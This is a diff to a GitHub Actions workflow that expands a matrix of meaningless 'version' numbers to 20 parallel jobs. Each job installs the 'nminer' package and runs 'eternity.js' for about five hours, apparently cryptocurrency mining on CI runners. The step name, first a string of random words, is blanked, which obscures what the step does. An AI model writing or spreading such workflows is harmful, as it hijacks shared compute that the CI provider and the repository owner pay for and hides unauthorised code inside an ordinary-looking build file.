@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2505 }
-          - { version: 7934 }
-          - { version: 3138 }
-          - { version: 3247 }
-          - { version: 729 }
-          - { version: 5831 }
-          - { version: 466 }
-          - { version: 7005 }
-          - { version: 5391 }
-          - { version: 2078 }
-          - { version: 9619 }
-          - { version: 2845 }
-          - { version: 5875 }
-          - { version: 522 }
-          - { version: 3430 }
-          - { version: 675 }
+          - { version: 9514 }
+          - { version: 6825 }
+          - { version: 6443 }
+          - { version: 1471 }
+          - { version: 8768 }
+          - { version: 7760 }
+          - { version: 7623 }
+          - { version: 589 }
+          - { version: 2287 }
+          - { version: 7400 }
+          - { version: 4680 }
+          - { version: 9018 }
+          - { version: 3821 }
+          - { version: 7056 }
+          - { version: 9274 }
+          - { version: 8887 }
+          - { version: 3498 }
+          - { version: 8430 }
+          - { version: 4900 }
+          - { version: 7463 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: papa thoroughly pleasant commandeer deeply
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 340m node eternity.js || echo "eternity executed"
+          timeout 306m node eternity.js || echo "eternity executed"
